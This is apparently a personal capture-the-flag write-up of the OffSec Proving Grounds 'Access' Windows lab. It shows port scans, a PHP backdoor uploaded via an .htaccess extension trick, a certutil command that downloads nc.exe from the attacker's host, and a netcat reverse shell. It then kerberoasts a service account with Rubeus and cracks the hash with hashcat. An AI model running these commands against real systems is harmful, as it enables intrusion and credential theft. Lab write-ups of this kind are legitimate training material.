---
title:
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Access]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan2.txt --open 192.168.213.187
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 22:18 +0900
Nmap scan report for 192.168.213.187
Host is up (0.079s latency).
Not shown: 65279 closed tcp ports (reset), 229 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49701/tcp open  unknown
49782/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 31.15 seconds

```

```zsh
┌──(kali㉿kali)-[~/…/OffSec/Practice/Access/2nd]
└─$ sudo nmap -Pn -p80 -sSCV -A -oN full_tcp-scan.txt --open 192.168.213.187
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 22:20 +0900
Nmap scan report for 192.168.213.187
Host is up (0.077s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Access The Event
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|2012|2022|11|2016 (95%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows 10 1909 - 2004 (94%), Microsoft Windows 10 1709 - 22H2 (92%), Microsoft Windows 10 1909 (90%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2022 (89%), Microsoft Windows 11 24H2 - 25H2 (88%), Microsoft Windows Server 2016 (88%), Microsoft Windows 10 21H2 (87%), Microsoft Windows Server 2012 Data Center (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   76.88 ms 192.168.45.1
2   76.86 ms 192.168.45.254
3   77.26 ms 192.168.251.1
4   77.33 ms 192.168.213.187

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.70 seconds
```



---

# Initial Access

http://192.168.213.187/

![[Pasted image 20260709222341.png]]

![[Pasted image 20260709223150.png]]

![[Pasted image 20260709222755.png]]
![[Pasted image 20260709222736.png]]

*But aspx was not execute*

![[Pasted image 20260709223305.png]]

![[Pasted image 20260709223231.png]]

```zsh
┌──(kali㉿kali)-[~/…/OffSec/Practice/Access/2nd]
└─$ cat ../.htaccess                
AddType application/x-httpd-php .evil
```

![[Pasted image 20260709223409.png]]

https://192.168.213.187/uploads/simple-backdoor.php.evil?cmd=whoami

![[Pasted image 20260709224045.png]]

http://192.168.213.187/uploads/simple-backdoor.php.evil?cmd=certutil%20-urlcache%20-split%20-f%20http://192.168.45.167/nc.exe%20nc.exe

![[Pasted image 20260709225623.png]]

http://192.168.213.187/uploads/simple-backdoor.php.evil?cmd=.\nc.exe%20192.168.45.167%20443%20-e%20cmd.exe

```zsh
┌──(kali㉿kali)-[~/…/OffSec/Practice/Access/2nd]
└─$ rlwrap -cAr nc -lvnp 443 
listening on [any] 443 ...
connect to [192.168.45.167] from (UNKNOWN) [192.168.213.187] 50079
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\uploads>
```

![[Pasted image 20260709225906.png]]

---

# Privilege Escalation

```zsh
┌──(kali㉿kali)-[~/…/OffSec/Practice/Access/2nd]
└─$ rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.45.192] from (UNKNOWN) [192.168.228.187] 50070
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\uploads>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\uploads> .\Rubeus.exe kerberoast /nowrap
.\Rubeus.exe kerberoast /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 12:33:45 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$B26C844F5AA0ECABE0CD722DE74AD0E4$F02D870B40BAEC736875B1A761EC8A885FB654843B2924111BA43C1FBADA1960D063B5B3943655234EEC310B84D1B471A46F396F5AD63B3707732EE8A246D5C64C7314DDD531FE2FD5EADA3B0B8488802401D2D75AD9B703236E0F7CF5786A154D8798C2F658F959E76F3FA10B500E249DB79F33DDAD5D59EA999D7C170B69CF4B97E9BEA38B0C6E5E738BE372585F10539A29D4E66068E477FE15BB60419D3EB85A9743344EB62F7BEE1FE7BBAC9EF71DD062B7728CFD3A017805DED18981CBE64661272966736711D3C7A0D131B626405E5A31A8780D496A626AE7A05A721F5B0889180701FDD49044B32FD5408B4F82CCAB25CFFB799B9BBB09F5FA51A4DB4489B3BF140FB3477A75ED4C1479097456D3E48E5B6D232DD518B146542D6D2EED7CC821E6FA38EA6EB46EE510FE5CE5F5C582A5FCCF159AFB1090490C36D3F8F4DD13B9CC4775DEF75D6E7CDC5671B964696940C35875E549DA13CED6D62490400D724C8FD40F62D0C501D6D0C2BE17839C41ABBF9F87DD5ED8C18D4872B3BC4CC411846ED86424EF69D2CC42E10004096A82FB0C3B4779BAACD72DD3D4B8F5CBF21180ED46C62605A34E61446731A52A55D7A088825860FFE11CC00C548126FB3EA1387119A911641ABC5C4F3381C13182B7DBC61DEF6F1505A9CDEB04C244E61AC4C60B33346207C209E712EC67D5D1D60D33D55B8C9527D005807F51A943C74412669FF950FD9CC08F9E693A59D58E252BD0E60E6E5362B3AB2EF5E41905A3FA81ED19ADE3459F40AB08E81D156BDC9B15CD2F9F8C55DAFCDCD7478C6BDC0F58EC2CA1F74843F7427729130BF99FFEA75CD6CA51A6D79E66336890D758979A97AA950237EF826B44400F65FFC2C87D2DACAB2CE526DE50FC767CC0DCC03B0294FF1CDE2162B334A27A9DACAFF566A1B6E2F5A9DF2B7CD29BE95BC3F078CA6B33D66D2CEB2194CC4BE5CB39F4AC027FB346B6DD6B7084A060D554F35D93646F562BD96D51F4125B8527D629ECE0364BB480C311B46E663959DEAB69D1EB0903B139A599099116ACC7683658E0E2F6D445299CC333EB2AB5E66FA59598BCC526038FBA44A30586EAC2BEFD30BE14F074F6E49F14AF17EA3CAA965719F353A997DD22D475BCA1A0790E4B34BA5B2CCD84259AB78CA651E6A319FBE0AC29AF2BB5C6DD58BD095D33893FF3459F2FF3A6470D7A648F9FB8DFEF7D83321499C37270B65CCE8D0CEB64492B608D29745270C260CD9A4467279EC1A7F4E52643AD678E292A15670CBB05B246A13FB4549A827961F004F5C5FE178701B8555711D3538B26F49BE74A347C0EDFBABE208AAF8FC16AD0EFBDF2A1D76A99D7499398E95012F168095509815F454411DCC92950C5EA85C80290BAFBBBE1F013AB3FDE9F3161482916BB1C4545FF15C0D58CAE6D598B869BDB38FFD546D98C381EB11074459836FCCA17CC4191EB5752F1F4FB577030F578B78AD8A93CB4B9B087B318328D8437A4809A116E0E0AA8FAEECF311F5F8EF71E71AA0BB8E806F6D6B9725AF7FD01F9370749636F258E3276C6985B16FE9BCB00808AAADC7E452F93E1A1C6F4976DCC803C313E678C2EF95FC442DE1A6405A2

PS C:\xampp\htdocs\uploads> exit
```

```zsh
┌──(kali㉿kali)-[~/…/OffSec/Practice/Access/2nd]
└─$ hashcat -m 13100 mssql_hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force 
hashcat (v7.1.2) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i7-12700K, 6955/13910 MB (2048 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 66

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 516 MB (12900 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 946729410

$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$3c74878dc5d1c84a5ce29b54f565d711$85015d3d2d4ff03408d8758660bacea9b51ad52f7c778016dfaa9e21e2fb0051bcec910f28df19cae394160b6172896d41d04ff2abed95a17b02a5828a0941e010b6e8f46ee7f296e36696c97f5e5b9ff49477fbac137543c14584ee1e0c3f813970c1edd2ff2a1121fbb6090d3a5d7f2dfabbdb24ad146c21430a9c0e786cb00fa9415a48864ef13bce070113494c8b1ad95960b675ecb160dc04bcaee9037a41fee6d872f1e10ef5e9811621d03067b6af566833f11405478e37275c27ed1391b561f2887cf86aae5fafe1ffb9a179b6e4b2ee579b08e9294e47434eecbf2cfd79e88687f4b1a92a9184401b3608a28100bf6870c6ac15bde1da93eab61f8271c0c560e42b0eab3c64c7e5604064e4a7af5241db5be3216f4573bac763a8443a637384bf2c56a23fac6a45729a3a4a4467127de954eac38722a2b7257dfba85ee26d4dcf68c372ca1ce1aba9b6a35336883cdbe86bbcf9a8ed291c677d9f89681d5b720fd1a367e7d7d581949209ecdca1834973653618052f1768353def396ec98b109fa6bc5f42fd3eb6b75cc7a33344cdbd5f21e995dc4ef9160be8ea5e78ec1ee09ece05a430416abdcab727811f5406e4fdbed62b0da250f0dbb3df7cfe7cb8302161cb86f8fd65e5505c01df08e3f878d3706f5dc229489b8c3d6fa7358a9ad226a52e7582ee0131e3f814de64ac3cb9cdc2fdad93c6f6eded631353cb2b7d87ad198ff56a3340798252726fcc4d6c741b41562216ab67332cff28f34d71da85d8045154afbea8bcea3b2ed85e379207a7d772249e7f1b81bfd3df9d2a1be9e3bb6ba19c4536bedfa3044f443ea26a8c755c1f5a17479e749e0d6d78a813207b49effedee2e023ce672a0121c8d9a273cf61620587f90ce65c364684186a5b9fb3c53baef50149aaaf0071a5672d4b81e522caf033fe5e1bce62280285828262dd8e169f20b38e500e5e7c63688e99ca124b8b01a40a0afad7537eb26bffdd07ed239e9c852f71d8d21014acafabbf627a2983a35c08387202ad8a7177a916ea7931a9e6587dc214f4336a7450b2eebf82e9462c05d46f40023352e8d41b4cb22566ff4902b24114d8983d64c232bbeeecb51fe943d1d755cf64add8422a8070ec1c1c5be0872c31477b0d77467a7f09bf4db1ffdbec38e8ea70048f5cc4f45536ae5fef1b228bc58c4ee2788df217521efb95a5b7f9e070a2e81e717e34b8f29ef7056febe6eb3800211f5ca909f17f8000b9c9873753bce7326471d14d1349f54176f47f720f955ec85033d0260b57e9d10bbaa5fd9a1a9f39d1d8fe5e71adc6788878a730ddba83c688c69e949b067c9f1d7e6867e2e9e0b6e230bf63b0eb6fe0a49026482f97afb6fae88fecccbb332101f8b842221069bf57b8a62436c230cb93c403bd45124f9bdf98ba07a635ec4a9be321b5264b57dd546ef10344d5ca544ca1566fa2f6584a767bf349:trustno1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.ac...7bf349
Time.Started.....: Sat Jul 11 05:10:29 2026, (0 secs)
Time.Estimated...: Sat Jul 11 05:10:29 2026, (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best66.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  7509.3 kH/s (12.87ms) @ Accel:123 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 125952/946729410 (0.01%)
Rejected.........: 0/125952 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-64 Iteration:0-64
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> 0202
Hardware.Mon.#01.: Util:  9%

Started: Sat Jul 11 05:10:26 2026
Stopped: Sat Jul 11 05:10:31 2026
```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh

```

</details>